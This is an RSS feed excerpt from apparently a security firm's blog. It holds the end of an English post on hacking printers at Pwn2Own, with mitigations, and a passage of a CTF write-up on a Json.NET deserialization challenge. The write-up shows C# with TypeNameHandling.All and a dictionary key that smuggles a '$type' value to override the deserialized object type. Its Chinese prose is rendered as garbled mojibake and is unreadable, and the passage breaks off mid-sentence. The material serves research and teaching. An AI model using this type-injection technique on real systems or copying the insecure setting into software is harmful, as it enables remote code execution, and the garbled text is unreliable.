&lt;p&gt;After that, we also tried to change the backdoor to the debug console to facilitate many functions, such as viewing memory information, playing music, etc.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; used the function of playing music to present it at that time. It is fascinating. You can go &lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;here&lt;/a&gt; to look at the situation at the Pwn2Own.&lt;/p&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;In Pwn2Own Austin 2021, we got 2nd place after pwning other devices and printers. We had a good experience and learned some new things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;The first is to update regularly. All the printers mentioned have been patched. It is often ignored. We usually find printers lack of update for several years and even leave the default password directly in the corporate intranet.&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;
&lt;p&gt;Another mitigation is to turn off services that are not in use as much as possible. Most printers default enable too many services that are usually unused. We even think that you can turn off the discovery service,
just open the service you want to use.&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;It would be better if you could apply a firewall. Most printers provide related functions.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;With code execution on the printers, in addition to printing things on the LCD, we can use the printer to steal confidential information, whether it is confidential documents or some credential. We can also use the printer for &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_Lateral_Movement&quot;&gt;lateral movement&lt;/a&gt;, and because it is hard to detect, making it an excellent target for the red team.&lt;/p&gt;

&lt;p&gt;By the way, the protocols of the discovery service series on many printers are often vulnerable. If you want to find vulnerabilities in printers or other IoT devices, you can look in this direction.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To Be Continue&lt;/h2&gt;
&lt;p&gt;We also found several vulnerabilities in the printer series at &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; last year. We will be releasing detailed information soon, so stay tuned for Part II.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HITCON 2023 x DEVCORE Wargame: My todolist Write-up</title>
                <description>&lt;p&gt;ÁÇ∫‰∫Ü HITCON 2023 Ê¥ªÂãïÔºåÊàë‰ªäÂπ¥‰πüÂú® DEVCORE Êî§‰Ωç‰∏äÊ∫ñÂÇô‰∫Ü‰∏âÈ°åË∂£Âë≥ÊÄßË≥™ÁöÑ Wargame È°åÁõÆËÆìÂèÉË≥ΩËÄÖÂú®ËÅΩÂÆåË≠∞Á®ãÁöÑÁ©∫Èñí‰πãÈ§òÂèØ‰ª•‰∫´Âèó‰∏Ä‰∏ãË¶™Ëá™ÂãïÊâãËß£È°åÁöÑÂø´Ê®ÇÔºåËÄåÈô§‰∫ÜÊàëÊâÄÊ∫ñÂÇôÁöÑÈ°åÁõÆ‰ª•Â§ñÔºåÂåÖÊã¨ÂÖ∂‰ªñÊâÄÊúâÈ°åÁõÆÈÉΩÂèØ‰ª•Âú®‰ª•‰∏ãÁöÑ GitHub repository Ë£°ÊâæÂà∞Ôºö&lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023&quot;&gt;https://github.com/DEVCORE-Wargame/HITCON-2023&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÊ¨°Ê∫ñÂÇôÁöÑÈ°åÁõÆÂàÜÂà•ÊòØ What‚Äôs my IP„ÄÅSubmit flag Âíå My todolist„ÄÇÁ¨¨‰∏ÄÂÄãÈ°åÁõÆ What‚Äôs my IP Âè™Ë¶ÅÁúãÁ®ãÂºèÁ¢ºÂ∞±ÊúÉÁü•ÈÅìÊòØÂÄã HTTP header ÂÅΩÈÄ† IP Âä†‰∏ä SQL Injectin Âà©Áî®ÁöÑÁ∞°ÂñÆÈ°åÔºåÂè™ÊòØÊ¥ªÂãïÊúüÈñìÂèÉË≥ΩËÄÖÂÄëÂæóÊÜëËëóÁ∂ìÈ©óËàáÈß≠ÂÆ¢Áõ¥Ë¶∫‰ª•ÈªëÁÆ±ÊñπÂºèÊâæÂá∫Âº±ÈªûÁöÑÂ≠òÂú®„ÄÇÁ¨¨‰∫åÂÄãÈ°åÁõÆ Submit flag Â∞±ÊòØ‰∏ÄÂÄãÁ∂ìÂÖ∏ÁöÑ Race ConditionÔºåÊòØ‰∏ÄÂÄãËÄÅÊ¢ó‰ΩÜ‰πüÊòØÊª≤ÈÄèÊ∏¨Ë©¶‰∏≠Á∂ìÂ∏∏Ë¢´ÂøΩÁï•ÁöÑÁ¥∞ÁØÄÔºåÁÇ∫‰∫ÜÊèêÈ´òÊàêÂäüÁéáÂæûËÄåÈÅøÂÖçËÆìÂèÉÂä†ËÄÖÊµ™Ë≤ªÂ§™Â§öÊôÇÈñìÔºåÊàëÁâπÂú∞Âú®‰∏≠ÈñìÊèíÂÖ•‰∏çÂøÖË¶ÅÁöÑ sleepÔºåÈõñÁÑ∂ÂèØËÉΩËÆìÈ°åÁõÆËÆäÂæóÈÅéÊñºÁ∞°ÂñÆÔºåÂ∏åÊúõËá≥Â∞ëËÉΩÊèêÈÜíÂ§ßÂÆ∂ÂõûÊÉ≥Ëµ∑ÈÇÑÂ≠òÂú®ÈÄôÁ®ÆÂº±ÈªûÂ∞±Â§™Â•Ω‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæå‰∏ÄÂÄãÈ°åÁõÆ‰πüÊòØÊú¨ÁØáÊñáÁ´†ÊÉ≥Ë¶ÅÂíåÂ§ßÂÆ∂ÂàÜ‰∫´ÁöÑ‰∏ªÈ°åÔºöMy todolist„ÄÇÂæûÁµêË´ñËÄåË®ÄÔºåÈÄôÊòØ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑ Json.NET ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÁôΩÁÆ±È°åÁõÆÔºåÂ≠òÂú®ÊºèÊ¥ûÁöÑ‰ΩçÁΩÆÊòØÂú®Á®ãÂºèÁ¢º &lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023/blob/main/challenges/web/My%20todolist/MyTodolist/MyTodolist/Extensions/WebExtension.cs#L20&quot;&gt;Extensions/WebExtension.cs&lt;/a&gt; ÁöÑÁ¨¨ 20 Ë°åÔºå‰ΩÜÊàëÊÉ≥Á®çÂæÆÂíåÂ§ßÂÆ∂ÂàÜ‰∫´È°åÁõÆÁöÑÁî±‰æÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;È°åÁõÆËµ∑Ê∫êÊñºÊàëÊõæÁ∂ìÂú®Êüê‰∫õÁ®ãÂºè‰∏≠ÁúãÈÅéÈ°û‰ºº‰ª•‰∏ãÁöÑ Deep Copy ÂØ¶‰ΩúÔºö&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÈÉΩÁü•ÈÅìÁï∂ DeserializeObject ÁöÑ‰æÜÊ∫êÂ≠ó‰∏≤ÂèØ‰ª•ÊéßÂà∂‰∏¶‰∏îÈñãÂïü TypeNameHandling ÊôÇÔºåÊàëÂÄëÂèØ‰ª•ËºïÊòìÂà©Áî®ÂèçÂ∫èÂàóÂåñËÉΩÂàùÂßãÂåñ‰ªªÊÑèÁâ©‰ª∂ÁöÑÁâπÊÄßÂü∑Ë°å‰ªªÊÑèÁ®ãÂºèÁ¢ºÊàñÁ≥ªÁµ±Êåá‰ª§ÔºåÁÑ∂ËÄåÂú® Deep Clone ÁöÑ‰ΩøÁî®ÊÉÖÂ¢É‰∏ãÔºå‰æÜÊ∫êÂ≠ó‰∏≤ÊòØ SerializeObject ÁöÑËº∏Âá∫ÁµêÊûúÔºåÈÄô‰ª£Ë°®Ëëó‰ªª‰ΩïÊ®ôË®òÁâ©‰ª∂ÂêçÁ®±ÁöÑ $type Â±¨ÊÄß‰πüÊòØÁî± Json.NET ÊâÄÊéßÂà∂ËÄåÈùûÁî±ÊàëÂÄëÊéßÂà∂ÔºåÊâÄ‰ª•ÈÄôË°®Á§∫ÈÄôÊÆµÁ®ãÂºèÁ¢ºÊáâË©≤ÊòØÁÑ°Ê≥ïË¢´Âà©Áî®ÁöÑÊâçÂ∞çÔºåÈô§ÈùûÔºåËã•ÊàëÂÄëÂèØ‰ª•Ë¶ÜËìã $type Â±¨ÊÄßÁöÑË©±Âë¢Ôºü&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄãÁñëÂïèÂãæËµ∑‰∫ÜÊàëÁöÑÂ•ΩÂ•áÂøÉÔºåÂõ†Ê≠§ËÆìÊàëÊ±∫ÂÆöÈÄ≤Ë°å‰∏Ä‰∫õÂòóË©¶ÔºåÁï∂ÊàëÂòóË©¶Áî®‰ª•‰∏ãÁ®ãÂºèÁ¢ºÂ∫èÂàóÂåñ‰∏ÄÂÄã Dictionary Áâ©‰ª∂ÊôÇÔºåÊàëÂæóÂà∞‰∫Ü‰∏ÄÂÄãÊúâË∂£ÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁµêÊûúÔºö&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∂ÊàëÂÄëÂ∫èÂàóÂåñ Dictionary ÊôÇÔºåÊàëÂÄëÊâÄÊèíÂÖ•ÁöÑ‰ªª‰Ωï key Âíå value ÁöÑ pair ÈÉΩÂíå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; Â±¨ÊÄßÂÄºÂú®Âêå‰∏ÄÂÄãÂ±§Á¥öÔºåÈÇ£ÂÅáË®≠ÊàëÂÄë Dictionary ÂÖßÂê´ÊúâÂÄºÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; ÁöÑ key ÊôÇÔºåÊúÉÁôºÁîü‰ªÄÈ∫º‰∫ãÊÉÖÔºü&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊúÉÂæóÂà∞‰∏ÄÂÄã‰æãÂ§ñÈåØË™§Ôºö&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Newtonsoft.Json.JsonSerializationException: ‚ÄòType specified in JSON ‚ÄòSystem.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a‚Äô is not compatible with ‚ÄòSystem.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089‚Äô. Path ‚Äò$type‚Äô, line 1, position 236.‚Äô&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ëã•Âª∫Á´ã debug Êñ∑ÈªûÂ∞á JsonConvert.SerializeObject ÁöÑÁµêÊûúÂ≠ó‰∏≤Âç∞Âá∫‰æÜÊúÉÂæóÂà∞Ôºö&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂ÂØ¶ÂæûÈÄôÊÆµÈåØË™§Ë®äÊÅØÂ∞±ÂèØ‰ª•ÁåúÊ∏¨Âá∫Â§ßËá¥Âá∫ÈåØÁöÑÂèØËÉΩÊÄßÔºåÂ¶ÇÊûúÂÜçÁ®çÂæÆËøΩÂÖ•Á®ãÂºèÁ¢ºÂ∞±ÊúÉÁôºÁèæÔºåÊàëÂÄëË®≠ÂÆöÁöÑÁ¨¨‰∫åÂÄã $type Á¢∫ÂØ¶ÊàêÂäüËÆì Json.NET ÂòóË©¶ÂéªË¶ÜËìãÁ¨¨‰∏ÄÂÄã $type ÊåáÂÆöÁöÑÁâ©‰ª∂È°ûÂûãÔºå‰ΩÜ Json.NET Âú®ÈÄôÊÆµÁöÑËôïÁêÜÊúÉÊ™¢Êü•Á¨¨‰∫åÂÄãÁâ©‰ª∂È°ûÂûãÊòØÂê¶ËÉΩÂ§†Áõ∏ÂÆπÊñºÁ¨¨‰∏ÄÂÄãÁâ©‰ª∂È°ûÂûãÔºå‰πüÂ∞±ÊòØÊ™¢Êü•ÊòØÂê¶ assignableÔºåËã•ÊàëÂÄëËÉΩÊâæÂà∞ÊüêÂÄãÈ°û Dictionary Áâ©‰ª∂ÂèØ‰ª•ÊàêÁÇ∫ gadget ÁöÑË©±ÔºåÈÄôÊÆµÁ®ãÂºèÁ¢º‰πüË®±Â∞áÊàêÁÇ∫ exploitable„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜË¶ÅÊåñÊéòÊñ∞ÁöÑ gadget ÂçÅÂàÜÂõ∞Èõ£ÔºåËÄå‰∏îÂ∞±ÁÆóÊâæÂà∞‰∫ÜÔºåË¶Å‰ΩúÁÇ∫ Wargame È°åÁõÆ‰πüÂèØËÉΩÈÅéÊñºÂàÅÈõ£ÔºåÊâÄ‰ª•ÊàëÈÄôÈÇäÊâæÂà∞‰∫Ü‰∏ÄÁ®ÆËÆäÁ®ÆÊÉÖÂ¢ÉÔºåÈõñÁÑ∂ÊòØ‰∏çÂ∏∏Ë¶ãÁöÑË®≠ÂÆöÔºå‰ΩÜÊàëË¶∫Âæó‰ΩúÁÇ∫‰∏ÄÈÅìÈ°åÁõÆÊÉÖÂ¢ÉÁöÑË©±ÊúÉÈùûÂ∏∏ÊúâË∂£„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄãÈ°åÁõÆÊÉÖÂ¢ÉÁöÑÈóúÈçµÊòØ &lt;a href=&quot;https://www.newtonsoft.com/json/help/html/deserializemetadatapropertyhandling.htm&quot;&gt;MetadataPropertyHandling.ReadAhead&lt;/a&gt; ÈÄôÂÄãË®≠ÂÆöÂÄºÔºåÁï∂Êèê‰æõÁµ¶ JsonConvert.DeserializeObject ÁöÑ JsonSerializerSettings ‰∏≠ÊúâÂåÖÂê´ MetadataPropertyHandling.ReadAhead ÊôÇÔºåÂÆÉÊúÉÂÅáË®≠ $type ‰∏çÊòØÂú®Á¨¨‰∏ÄÂÄãÂ±¨ÊÄßÂÄºÁöÑ‰ΩçÁΩÆÔºåÈÄôÊúÉÂ∞éËá¥ Json.NET ÂÖàÂòóË©¶ÂæûÈ†≠Âà∞Â∞æÊää JSON Ëß£ÊûêÂÆå‰∏¶ÊâæÂá∫ $type ÂæåÊâçÈñãÂßãÂª∫Á´ãÁâ©‰ª∂ÔºåÂú®Ê≠§ÊÉÖÂ¢É‰∏ã‰πüÊúÉËÆìÊàëÂÄëÊ≥®ÂÖ•ÁöÑÁ¨¨‰∫åÂÄã $type Áõ¥Êé•Ë¶ÜËìãÁ¨¨‰∏ÄÂÄã $type 